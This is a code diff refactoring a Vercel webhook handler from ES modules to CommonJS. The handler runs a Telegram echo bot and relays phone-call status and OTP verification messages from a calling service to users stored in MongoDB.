@@ -1,25 +1,14 @@
-// ================= Vercel Config =================
-export const config = {
-  api: {
-    bodyParser: true,
-  },
-};
+require("dotenv").config();
 
-// ================= Imports =================
-import dotenv from "dotenv";
-import TelegramBot from "node-telegram-bot-api";
-import mongoose from "mongoose";
+const TelegramBot = require("node-telegram-bot-api");
+const mongoose = require("mongoose");
 
-dotenv.config();
+// ============ MongoDB Cache ============
 
-// ================= MongoDB Cache =================
 let cached = global.mongoose;
 
 if (!cached) {
-  cached = global.mongoose = {
-    conn: null,
-    promise: null,
-  };
+  cached = global.mongoose = { conn: null, promise: null };
 }
 
 async function connectDB() {
@@ -37,48 +26,38 @@ async function connectDB() {
   return cached.conn;
 }
 
-// ================= Telegram Bot Cache =================
-let bot = global.telegramBot;
+// ============ Telegram Bot (Webhook Mode) ============
 
-if (!bot) {
-  console.log("🤖 Initializing Telegram Bot...");
+const bot = new TelegramBot(process.env.BOT_TOKEN, {
+  webHook: true,
+});
 
-  bot = global.telegramBot = new TelegramBot(
-    process.env.BOT_TOKEN,
-    {
-      webHook: true,
-    }
-  );
+// ============ Bot Commands ============
 
-  // ============ Bot Commands ============
+bot.on("message", async (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text || "";
 
-  bot.on("message", async (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text;
+  console.log("📩 Message:", text);
 
-    console.log("📩 Message:", text);
+  if (text === "/start") {
+    await bot.sendMessage(chatId, "✅ Bot is online!");
+    return;
+  }
 
-    if (text === "/start") {
-      await bot.sendMessage(
-        chatId,
-        "✅ Bot is online!\nSend /help to see commands."
-      );
-      return;
-    }
+  if (text === "/help") {
+    await bot.sendMessage(
+      chatId,
+      "📌 Commands:\n/start - Start\n/help - Help"
+    );
+    return;
+  }
 
-    if (text === "/help") {
-      await bot.sendMessage(
-        chatId,
-        "📌 Commands:\n/start - Check bot\n/help - Help menu"
-      );
-      return;
-    }
+  await bot.sendMessage(chatId, "🤖 You said: " + text);
+});
 
-    await bot.sendMessage(chatId, "🤖 I received: " + text);
-  });
-}
+// ============ User Model ============
 
-// ================= Mongo Model =================
 const User =
   mongoose.models.User ||
   mongoose.model("User", {
@@ -90,33 +69,26 @@ const User =
     otp: String,
   });
 
-// ================= Webhook Handler =================
-export default async function handler(req, res) {
+// ============ Vercel Handler ============
+
+module.exports = async function handler(req, res) {
   try {
     await connectDB();
 
     const body = req.body;
 
-    console.log("📡 Webhook Received");
-
-    // ================= Telegram Webhook =================
-    if (body?.message || body?.edited_message) {
+    // Telegram Webhook
+    if (body && body.message) {
       await bot.processUpdate(body);
       return res.status(200).send("OK");
     }
 
-    // ================= Ringg Webhook =================
-    if (body?.phone) {
+    // Ringg Webhook
+    if (body && body.phone) {
       const { phone, step, intent, digits, status } = body;
 
-      console.log("📞 Ringg:", phone, status, step);
-
       const user = await User.findOne({ phone });
-
-      if (!user) {
-        console.log("❌ User not found:", phone);
-        return res.send("OK");
-      }
+      if (!user) return res.send("OK");
 
       if (status === "ringing") {
         await bot.sendMessage(user.chatId, "📞 Ringing...");
@@ -141,25 +113,23 @@ export default async function handler(req, res) {
 
         await bot.sendMessage(
           user.chatId,
-          `🔐 Verification Code: ${otp}\n\nEnter it in Telegram.`
+          `🔐 OTP: ${otp}\nEnter it in Telegram`
         );
       }
 
       if (step === "otp_step" && digits) {
         await bot.sendMessage(
           user.chatId,
-          `📲 OTP entered on call: ${digits}`
+          `📲 OTP entered: ${digits}`
         );
       }
 
       return res.send("OK");
     }
 
-    // ================= Default =================
-    return res.status(200).send("OK");
-
+    return res.send("OK");
   } catch (err) {
     console.error("❌ Webhook Error:", err);
     return res.status(500).send("Error");
   }
-}
+};
